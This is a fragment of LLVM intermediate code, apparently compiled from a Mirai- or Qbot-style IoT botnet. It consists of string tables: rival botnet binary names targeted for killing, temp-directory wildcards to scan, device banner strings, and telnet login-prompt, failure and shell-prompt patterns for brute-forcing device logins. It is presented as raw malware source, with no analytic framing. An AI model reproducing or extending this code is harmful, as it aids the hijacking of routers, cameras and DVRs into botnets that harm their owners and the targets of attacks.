@.str.159 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.160 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.161 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.162 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.163 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.164 = private unnamed_addr constant [7 x i8] c"owari*\00", align 1
@.str.165 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.166 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.167 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.168 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.169 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.170 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.171 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.172 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.173 = private unnamed_addr constant [7 x i8] c"badbox\00", align 1
@.str.174 = private unnamed_addr constant [7 x i8] c"Mirai*\00", align 1
@.str.175 = private unnamed_addr constant [11 x i8] c"cunty*IoT*\00", align 1
@.str.176 = private unnamed_addr constant [11 x i8] c"jackmymips\00", align 1
@.str.177 = private unnamed_addr constant [13 x i8] c"jackmymips64\00", align 1
@.str.178 = private unnamed_addr constant [13 x i8] c"jackmymipsel\00", align 1
@.str.179 = private unnamed_addr constant [12 x i8] c"jackmysh2eb\00", align 1
@.str.180 = private unnamed_addr constant [13 x i8] c"jackmysh2elf\00", align 1
@.str.181 = private unnamed_addr constant [10 x i8] c"jackmysh4\00", align 1
@.str.182 = private unnamed_addr constant [10 x i8] c"jackmyx86\00", align 1
@.str.183 = private unnamed_addr constant [12 x i8] c"jackmyarmv5\00", align 1
@.str.184 = private unnamed_addr constant [14 x i8] c"jackmyarmv4tl\00", align 1
@.str.185 = private unnamed_addr constant [12 x i8] c"jackmyarmv4\00", align 1
@.str.186 = private unnamed_addr constant [12 x i8] c"jackmyarmv6\00", align 1
@.str.187 = private unnamed_addr constant [11 x i8] c"jackmyi686\00", align 1
@.str.188 = private unnamed_addr constant [14 x i8] c"jackmypowerpc\00", align 1
@.str.189 = private unnamed_addr constant [19 x i8] c"jackmypowerpc440fp\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"jackmyi586\00", align 1
@.str.191 = private unnamed_addr constant [11 x i8] c"jackmym68k\00", align 1
@.str.192 = private unnamed_addr constant [12 x i8] c"jackmysparc\00", align 1
@.str.193 = private unnamed_addr constant [13 x i8] c"jackmyx86_64\00", align 1
@.str.194 = private unnamed_addr constant [11 x i8] c"hackmymips\00", align 1
@.str.195 = private unnamed_addr constant [13 x i8] c"hackmymips64\00", align 1
@.str.196 = private unnamed_addr constant [13 x i8] c"hackmymipsel\00", align 1
@.str.197 = private unnamed_addr constant [12 x i8] c"hackmysh2eb\00", align 1
@.str.198 = private unnamed_addr constant [13 x i8] c"hackmysh2elf\00", align 1
@.str.199 = private unnamed_addr constant [10 x i8] c"hackmysh4\00", align 1
@.str.200 = private unnamed_addr constant [10 x i8] c"hackmyx86\00", align 1
@.str.201 = private unnamed_addr constant [12 x i8] c"hackmyarmv5\00", align 1
@.str.202 = private unnamed_addr constant [14 x i8] c"hackmyarmv4tl\00", align 1
@.str.203 = private unnamed_addr constant [12 x i8] c"hackmyarmv4\00", align 1
@.str.204 = private unnamed_addr constant [12 x i8] c"hackmyarmv6\00", align 1
@.str.205 = private unnamed_addr constant [11 x i8] c"hackmyi686\00", align 1
@.str.206 = private unnamed_addr constant [14 x i8] c"hackmypowerpc\00", align 1
@.str.207 = private unnamed_addr constant [19 x i8] c"hackmypowerpc440fp\00", align 1
@.str.208 = private unnamed_addr constant [11 x i8] c"hackmyi586\00", align 1
@.str.209 = private unnamed_addr constant [11 x i8] c"hackmym68k\00", align 1
@.str.210 = private unnamed_addr constant [12 x i8] c"hackmysparc\00", align 1
@.str.211 = private unnamed_addr constant [13 x i8] c"hackmyx86_64\00", align 1
@.str.212 = private unnamed_addr constant [4 x i8] c"b10\00", align 1
@.str.213 = private unnamed_addr constant [4 x i8] c"b11\00", align 1
@.str.214 = private unnamed_addr constant [4 x i8] c"b12\00", align 1
@.str.215 = private unnamed_addr constant [4 x i8] c"b13\00", align 1
@.str.216 = private unnamed_addr constant [4 x i8] c"b14\00", align 1
@.str.217 = private unnamed_addr constant [4 x i8] c"b15\00", align 1
@.str.218 = private unnamed_addr constant [4 x i8] c"b16\00", align 1
@.str.219 = private unnamed_addr constant [4 x i8] c"b17\00", align 1
@.str.220 = private unnamed_addr constant [4 x i8] c"b18\00", align 1
@.str.221 = private unnamed_addr constant [4 x i8] c"b19\00", align 1
@.str.222 = private unnamed_addr constant [4 x i8] c"b20\00", align 1
@.str.223 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.224 = private unnamed_addr constant [8 x i8] c"kmymips\00", align 1
@.str.225 = private unnamed_addr constant [10 x i8] c"kmymips64\00", align 1
@.str.226 = private unnamed_addr constant [10 x i8] c"kmymipsel\00", align 1
@.str.227 = private unnamed_addr constant [9 x i8] c"kmysh2eb\00", align 1
@.str.228 = private unnamed_addr constant [10 x i8] c"kmysh2elf\00", align 1
@.str.229 = private unnamed_addr constant [7 x i8] c"kmysh4\00", align 1
@.str.230 = private unnamed_addr constant [7 x i8] c"kmyx86\00", align 1
@.str.231 = private unnamed_addr constant [9 x i8] c"kmyarmv5\00", align 1
@.str.232 = private unnamed_addr constant [11 x i8] c"kmyarmv4tl\00", align 1
@.str.233 = private unnamed_addr constant [9 x i8] c"kmyarmv4\00", align 1
@.str.234 = private unnamed_addr constant [9 x i8] c"kmyarmv6\00", align 1
@.str.235 = private unnamed_addr constant [11 x i8] c"botkillme*\00", align 1
@.str.236 = private unnamed_addr constant [8 x i8] c"kmyi686\00", align 1
@.str.237 = private unnamed_addr constant [11 x i8] c"kmypowerpc\00", align 1
@.str.238 = private unnamed_addr constant [16 x i8] c"kmypowerpc440fp\00", align 1
@.str.239 = private unnamed_addr constant [8 x i8] c"kmyi586\00", align 1
@.str.240 = private unnamed_addr constant [8 x i8] c"kmym68k\00", align 1
@.str.241 = private unnamed_addr constant [9 x i8] c"kmysparc\00", align 1
@.str.242 = private unnamed_addr constant [8 x i8] c"lolmips\00", align 1
@.str.243 = private unnamed_addr constant [10 x i8] c"lolmips64\00", align 1
@.str.244 = private unnamed_addr constant [9 x i8] c"lolsh2eb\00", align 1
@.str.245 = private unnamed_addr constant [10 x i8] c"lolsh2elf\00", align 1
@.str.246 = private unnamed_addr constant [7 x i8] c"lolsh4\00", align 1
@.str.247 = private unnamed_addr constant [7 x i8] c"lolx86\00", align 1
@.str.248 = private unnamed_addr constant [9 x i8] c"lolarmv5\00", align 1
@.str.249 = private unnamed_addr constant [11 x i8] c"lolarmv4tl\00", align 1
@.str.250 = private unnamed_addr constant [9 x i8] c"lolarmv4\00", align 1
@.str.251 = private unnamed_addr constant [9 x i8] c"lolarmv6\00", align 1
@.str.252 = private unnamed_addr constant [8 x i8] c"loli686\00", align 1
@.str.253 = private unnamed_addr constant [12 x i8] c"mirai.linux\00", align 1
@.str.254 = private unnamed_addr constant [11 x i8] c"mirai.mips\00", align 1
@.str.255 = private unnamed_addr constant [11 x i8] c"lolpowerpc\00", align 1
@.str.256 = private unnamed_addr constant [16 x i8] c"lolpowerpc440fp\00", align 1
@.str.257 = private unnamed_addr constant [8 x i8] c"loli586\00", align 1
@.str.258 = private unnamed_addr constant [8 x i8] c"lolm68k\00", align 1
@.str.259 = private unnamed_addr constant [9 x i8] c"lolsparc\00", align 1
@.str.260 = private unnamed_addr constant [8 x i8] c"telmips\00", align 1
@.str.261 = private unnamed_addr constant [10 x i8] c"telmips64\00", align 1
@.str.262 = private unnamed_addr constant [10 x i8] c"telmipsel\00", align 1
@.str.263 = private unnamed_addr constant [9 x i8] c"telsh2eb\00", align 1
@.str.264 = private unnamed_addr constant [10 x i8] c"telsh2elf\00", align 1
@.str.265 = private unnamed_addr constant [7 x i8] c"telsh4\00", align 1
@.str.266 = private unnamed_addr constant [7 x i8] c"telx86\00", align 1
@.str.267 = private unnamed_addr constant [9 x i8] c"telarmv5\00", align 1
@.str.268 = private unnamed_addr constant [11 x i8] c"telarmv4tl\00", align 1
@.str.269 = private unnamed_addr constant [9 x i8] c"telarmv4\00", align 1
@.str.270 = private unnamed_addr constant [9 x i8] c"telarmv6\00", align 1
@.str.271 = private unnamed_addr constant [8 x i8] c"teli686\00", align 1
@.str.272 = private unnamed_addr constant [11 x i8] c"telpowerpc\00", align 1
@.str.273 = private unnamed_addr constant [16 x i8] c"telpowerpc440fp\00", align 1
@.str.274 = private unnamed_addr constant [8 x i8] c"teli586\00", align 1
@.str.275 = private unnamed_addr constant [8 x i8] c"telm68k\00", align 1
@.str.276 = private unnamed_addr constant [9 x i8] c"telsparc\00", align 1
@.str.277 = private unnamed_addr constant [10 x i8] c"telx86_64\00", align 1
@.str.278 = private unnamed_addr constant [12 x i8] c"TwoFacemips\00", align 1
@.str.279 = private unnamed_addr constant [14 x i8] c"TwoFacemips64\00", align 1
@.str.280 = private unnamed_addr constant [14 x i8] c"TwoFacemipsel\00", align 1
@.str.281 = private unnamed_addr constant [13 x i8] c"TwoFacesh2eb\00", align 1
@.str.282 = private unnamed_addr constant [14 x i8] c"TwoFacesh2elf\00", align 1
@.str.283 = private unnamed_addr constant [11 x i8] c"TwoFacesh4\00", align 1
@.str.284 = private unnamed_addr constant [11 x i8] c"TwoFacex86\00", align 1
@.str.285 = private unnamed_addr constant [13 x i8] c"TwoFacearmv5\00", align 1
@.str.286 = private unnamed_addr constant [15 x i8] c"TwoFacearmv4tl\00", align 1
@.str.287 = private unnamed_addr constant [13 x i8] c"TwoFacearmv4\00", align 1
@.str.288 = private unnamed_addr constant [13 x i8] c"TwoFacearmv6\00", align 1
@.str.289 = private unnamed_addr constant [12 x i8] c"TwoFacei686\00", align 1
@.str.290 = private unnamed_addr constant [15 x i8] c"TwoFacepowerpc\00", align 1
@.str.291 = private unnamed_addr constant [20 x i8] c"TwoFacepowerpc440fp\00", align 1
@.str.292 = private unnamed_addr constant [12 x i8] c"TwoFacei586\00", align 1
@.str.293 = private unnamed_addr constant [12 x i8] c"TwoFacem68k\00", align 1
@.str.294 = private unnamed_addr constant [13 x i8] c"TwoFacesparc\00", align 1
@.str.295 = private unnamed_addr constant [14 x i8] c"TwoFacex86_64\00", align 1
@.str.296 = private unnamed_addr constant [5 x i8] c"xxb1\00", align 1
@.str.297 = private unnamed_addr constant [5 x i8] c"xxb2\00", align 1
@.str.298 = private unnamed_addr constant [5 x i8] c"xxb3\00", align 1
@.str.299 = private unnamed_addr constant [5 x i8] c"xxb4\00", align 1
@.str.300 = private unnamed_addr constant [5 x i8] c"xxb5\00", align 1
@.str.301 = private unnamed_addr constant [5 x i8] c"xxb6\00", align 1
@.str.302 = private unnamed_addr constant [5 x i8] c"xxb7\00", align 1
@.str.303 = private unnamed_addr constant [5 x i8] c"xxb8\00", align 1
@.str.304 = private unnamed_addr constant [5 x i8] c"xxb9\00", align 1
@.str.305 = private unnamed_addr constant [6 x i8] c"xxb10\00", align 1
@.str.306 = private unnamed_addr constant [6 x i8] c"xxb11\00", align 1
@.str.307 = private unnamed_addr constant [6 x i8] c"xxb12\00", align 1
@.str.308 = private unnamed_addr constant [6 x i8] c"xxb13\00", align 1
@.str.309 = private unnamed_addr constant [6 x i8] c"xxb14\00", align 1
@.str.310 = private unnamed_addr constant [6 x i8] c"xxb15\00", align 1
@.str.311 = private unnamed_addr constant [6 x i8] c"xxb16\00", align 1
@.str.312 = private unnamed_addr constant [6 x i8] c"xxb17\00", align 1
@.str.313 = private unnamed_addr constant [6 x i8] c"xxb18\00", align 1
@.str.314 = private unnamed_addr constant [6 x i8] c"xxb19\00", align 1
@.str.315 = private unnamed_addr constant [6 x i8] c"xxb20\00", align 1
@.str.316 = private unnamed_addr constant [3 x i8] c"bb\00", align 1
@.str.317 = private unnamed_addr constant [11 x i8] c"busybotnet\00", align 1
@.str.318 = private unnamed_addr constant [5 x i8] c"pppd\00", align 1
@.str.319 = private unnamed_addr constant [6 x i8] c"pppoe\00", align 1
@.str.320 = private unnamed_addr constant [5 x i8] c"wput\00", align 1
@.str.321 = private unnamed_addr constant [4 x i8] c"DVR\00", align 1
@.str.322 = private unnamed_addr constant [7 x i8] c"*mirai\00", align 1
@.str.323 = private unnamed_addr constant [8 x i8] c"*.mirai\00", align 1
@.str.324 = private unnamed_addr constant [7 x i8] c"cunty*\00", align 1
@.str.325 = private unnamed_addr constant [3 x i8] c"pc\00", align 1
@.str.326 = private unnamed_addr constant [11 x i8] c"orion.mips\00", align 1
@.str.327 = private unnamed_addr constant [11 x i8] c"okiru.mips\00", align 1
@.str.328 = private unnamed_addr constant [15 x i8] c"nightcore.mips\00", align 1
@.str.329 = private unnamed_addr constant [3 x i8] c"ar\00", align 1
@.str.330 = private unnamed_addr constant [9 x i8] c"lsp.modz\00", align 1
@.str.331 = private unnamed_addr constant [11 x i8] c"nightcore*\00", align 1
@.str.332 = private unnamed_addr constant [6 x i8] c"netis\00", align 1
@.str.333 = private unnamed_addr constant [7 x i8] c"mipsxd\00", align 1
@.str.334 = private unnamed_addr constant [9 x i8] c"die.mips\00", align 1
@.str.335 = private unnamed_addr constant [13 x i8] c"dupessh*mips\00", align 1
@.str.336 = private unnamed_addr constant [7 x i8] c"linux*\00", align 1
@.str.337 = private unnamed_addr constant [7 x i8] c"mirai*\00", align 1
@.str.338 = private unnamed_addr constant [7 x i8] c"*.mips\00", align 1
@.str.339 = private unnamed_addr constant [4 x i8] c"pps\00", align 1
@.str.340 = private unnamed_addr constant [5 x i8] c"sh4*\00", align 1
@.str.341 = private unnamed_addr constant [6 x i8] c"wget*\00", align 1
@.str.342 = private unnamed_addr constant [5 x i8] c"ssh*\00", align 1
@.str.343 = private unnamed_addr constant [7 x i8] c"vulcan\00", align 1
@.str.344 = private unnamed_addr constant [10 x i8] c"jennifer*\00", align 1
@.str.345 = private unnamed_addr constant [7 x i8] c"okiru*\00", align 1
@.str.346 = private unnamed_addr constant [8 x i8] c"vulcana\00", align 1
@.str.347 = private unnamed_addr constant [8 x i8] c"vulcanb\00", align 1
@.str.348 = private unnamed_addr constant [8 x i8] c"vulcand\00", align 1
@.str.349 = private unnamed_addr constant [8 x i8] c"vulcane\00", align 1
@.str.350 = private unnamed_addr constant [8 x i8] c"vulcanx\00", align 1
@.str.351 = private unnamed_addr constant [8 x i8] c"vulcany\00", align 1
@.str.352 = private unnamed_addr constant [8 x i8] c"vulcanz\00", align 1
@.str.353 = private unnamed_addr constant [8 x i8] c"vulcang\00", align 1
@.str.354 = private unnamed_addr constant [8 x i8] c"vulcan*\00", align 1
@.str.355 = private unnamed_addr constant [8 x i8] c"apache2\00", align 1
@.str.356 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.357 = private unnamed_addr constant [7 x i8] c"gaybot\00", align 1
@.str.358 = private unnamed_addr constant [8 x i8] c"qghiqgd\00", align 1
@.str.359 = private unnamed_addr constant [8 x i8] c"cdnnqkk\00", align 1
@.str.360 = private unnamed_addr constant [8 x i8] c"uhnvepy\00", align 1
@.str.361 = private unnamed_addr constant [8 x i8] c"zrzyqyc\00", align 1
@.str.362 = private unnamed_addr constant [8 x i8] c"zvkghct\00", align 1
@.str.363 = private unnamed_addr constant [8 x i8] c"mykzydo\00", align 1
@.str.364 = private unnamed_addr constant [8 x i8] c"yyfizcz\00", align 1
@.str.365 = private unnamed_addr constant [8 x i8] c"zjevbar\00", align 1
@.str.366 = private unnamed_addr constant [8 x i8] c"lowssdj\00", align 1
@.str.367 = private unnamed_addr constant [8 x i8] c"aexpcjr\00", align 1
@.str.368 = private unnamed_addr constant [8 x i8] c"qssyevb\00", align 1
@.str.369 = private unnamed_addr constant [8 x i8] c"gcjiyol\00", align 1
@.str.370 = private unnamed_addr constant [8 x i8] c"inlxqjm\00", align 1
@.str.371 = private unnamed_addr constant [8 x i8] c"swgypcx\00", align 1
@.str.372 = private unnamed_addr constant [8 x i8] c"whsilop\00", align 1
@.str.373 = private unnamed_addr constant [8 x i8] c"ezmjymp\00", align 1
@.str.374 = private unnamed_addr constant [8 x i8] c"huscmww\00", align 1
@.str.375 = private unnamed_addr constant [8 x i8] c"pbhcocg\00", align 1
@.str.376 = private unnamed_addr constant [4 x i8] c"unk\00", align 1
@.str.377 = private unnamed_addr constant [5 x i8] c"unk*\00", align 1
@.str.378 = private unnamed_addr constant [5 x i8] c"unk1\00", align 1
@.str.379 = private unnamed_addr constant [5 x i8] c"unk2\00", align 1
@.str.380 = private unnamed_addr constant [5 x i8] c"unk3\00", align 1
@.str.381 = private unnamed_addr constant [5 x i8] c"unk4\00", align 1
@.str.382 = private unnamed_addr constant [7 x i8] c"smbvar\00", align 1
@.str.383 = private unnamed_addr constant [5 x i8] c"cert\00", align 1
@.str.384 = private unnamed_addr constant [10 x i8] c"neoisgay1\00", align 1
@.str.385 = private unnamed_addr constant [6 x i8] c"migg*\00", align 1
@.str.386 = private unnamed_addr constant [6 x i8] c"*ntpd\00", align 1
@.str.387 = private unnamed_addr constant [6 x i8] c"*sshd\00", align 1
@.str.388 = private unnamed_addr constant [10 x i8] c"miggsntpd\00", align 1
@.str.389 = private unnamed_addr constant [10 x i8] c"miggssshd\00", align 1
@.str.390 = private unnamed_addr constant [8 x i8] c"glbkjrn\00", align 1
@.str.391 = private unnamed_addr constant [8 x i8] c"vlbebuw\00", align 1
@.str.392 = private unnamed_addr constant [8 x i8] c"vqvdszx\00", align 1
@.str.393 = private unnamed_addr constant [8 x i8] c"ybahlvc\00", align 1
@.str.394 = private unnamed_addr constant [8 x i8] c"ttyuceq\00", align 1
@.str.395 = private unnamed_addr constant [8 x i8] c"keansia\00", align 1
@.str.396 = private unnamed_addr constant [8 x i8] c"scplnrh\00", align 1
@.str.397 = private unnamed_addr constant [8 x i8] c"eyqpmcb\00", align 1
@.str.398 = private unnamed_addr constant [8 x i8] c"thwbaja\00", align 1
@.str.399 = private unnamed_addr constant [8 x i8] c"ugenuge\00", align 1
@.str.400 = private unnamed_addr constant [8 x i8] c"pfdbupp\00", align 1
@.str.401 = private unnamed_addr constant [8 x i8] c"djnkpip\00", align 1
@.str.402 = private unnamed_addr constant [8 x i8] c"xvurmuo\00", align 1
@.str.403 = private unnamed_addr constant [8 x i8] c"xzywnsq\00", align 1
@.str.404 = private unnamed_addr constant [8 x i8] c"lztuvaq\00", align 1
@.str.405 = private unnamed_addr constant [8 x i8] c"pducsnb\00", align 1
@.str.406 = private unnamed_addr constant [8 x i8] c"adgjedp\00", align 1
@.str.407 = private unnamed_addr constant [8 x i8] c"khnklhx\00", align 1
@.str.408 = private unnamed_addr constant [7 x i8] c"svjqtj\00", align 1
@.str.409 = private unnamed_addr constant [7 x i8] c"yolwdx\00", align 1
@.str.410 = private unnamed_addr constant [7 x i8] c"aveckh\00", align 1
@.str.411 = private unnamed_addr constant [7 x i8] c"mltnkv\00", align 1
@.str.412 = private unnamed_addr constant [7 x i8] c"sawvqb\00", align 1
@.str.413 = private unnamed_addr constant [7 x i8] c"xxwkvy\00", align 1
@.str.414 = private unnamed_addr constant [7 x i8] c"hcgguc\00", align 1
@.str.415 = private unnamed_addr constant [7 x i8] c"tlrgju\00", align 1
@.str.416 = private unnamed_addr constant [7 x i8] c"yfdieg\00", align 1
@.str.417 = private unnamed_addr constant [7 x i8] c"kuvikr\00", align 1
@.str.418 = private unnamed_addr constant [7 x i8] c"kgymka\00", align 1
@.str.419 = private unnamed_addr constant [7 x i8] c"bxdusa\00", align 1
@.str.420 = private unnamed_addr constant [7 x i8] c"kmijih\00", align 1
@.str.421 = private unnamed_addr constant [7 x i8] c"cmnupe\00", align 1
@.str.422 = private unnamed_addr constant [7 x i8] c"jkuruo\00", align 1
@.str.423 = private unnamed_addr constant [7 x i8] c"hnqdok\00", align 1
@.str.424 = private unnamed_addr constant [7 x i8] c"vxemfi\00", align 1
@.str.425 = private unnamed_addr constant [7 x i8] c"xzdlvy\00", align 1
@Temp_Directorys = global [13 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.427, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.428, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.429, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.430, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.426, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.431, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.432, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.433, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.434, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.435, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.436, i32 0, i32 0), i8* null], align 16
@.str.426 = private unnamed_addr constant [7 x i8] c"/tmp/*\00", align 1
@.str.427 = private unnamed_addr constant [7 x i8] c"/var/*\00", align 1
@.str.428 = private unnamed_addr constant [11 x i8] c"/var/run/*\00", align 1
@.str.429 = private unnamed_addr constant [11 x i8] c"/var/tmp/*\00", align 1
@.str.430 = private unnamed_addr constant [16 x i8] c"/dev/netslink/*\00", align 1
@.str.431 = private unnamed_addr constant [7 x i8] c"/dev/*\00", align 1
@.str.432 = private unnamed_addr constant [11 x i8] c"/dev/shm/*\00", align 1
@.str.433 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.434 = private unnamed_addr constant [8 x i8] c"/boot/*\00", align 1
@.str.435 = private unnamed_addr constant [7 x i8] c"/usr/*\00", align 1
@.str.436 = private unnamed_addr constant [7 x i8] c"/opt/*\00", align 1
@advances = global [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.442, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.443, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.444, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.445, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.446, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.447, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.449, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.450, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i32 0, i32 0), i8* null], align 16
@.str.437 = private unnamed_addr constant [8 x i8] c"mdm9625\00", align 1
@.str.438 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@.str.439 = private unnamed_addr constant [5 x i8] c"F600\00", align 1
@.str.440 = private unnamed_addr constant [5 x i8] c"F660\00", align 1
@.str.441 = private unnamed_addr constant [5 x i8] c"F609\00", align 1
@.str.442 = private unnamed_addr constant [4 x i8] c"BCM\00", align 1
@.str.443 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.444 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.445 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.446 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.447 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.448 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@.str.449 = private unnamed_addr constant [5 x i8] c"nter\00", align 1
@.str.450 = private unnamed_addr constant [5 x i8] c"User\00", align 1
@.str.451 = private unnamed_addr constant [8 x i8] c"welcome\00", align 1
@fails = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.456, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.459, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.460, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.461, i32 0, i32 0), i8* null], align 16
@.str.452 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.453 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.454 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.455 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.456 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.457 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.458 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.459 = private unnamed_addr constant [7 x i8] c"ailure\00", align 1
@.str.460 = private unnamed_addr constant [4 x i8] c"bye\00", align 1
@.str.461 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@successes = global [18 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.463, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.464, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.448, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.437, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.438, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.439, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.440, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.441, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.465, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.466, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.467, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.468, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.469, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.442, i32 0, i32 0), i8* null], align 16
@.str.462 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.463 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.464 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@.str.465 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.466 = private unnamed_addr constant [8 x i8] c"version\00", align 1
@.str.467 = private unnamed_addr constant [2 x i8] c"v\00", align 1
@.str.468 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.469 = private unnamed_addr constant [8 x i8] c"command\00", align 1
@.str.470 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.452, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.453, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.454, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.455, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.456, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.457, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.458, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.462, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.463, i32 0, i32 0), i8* null], align 16
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.538 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.471 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.472 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
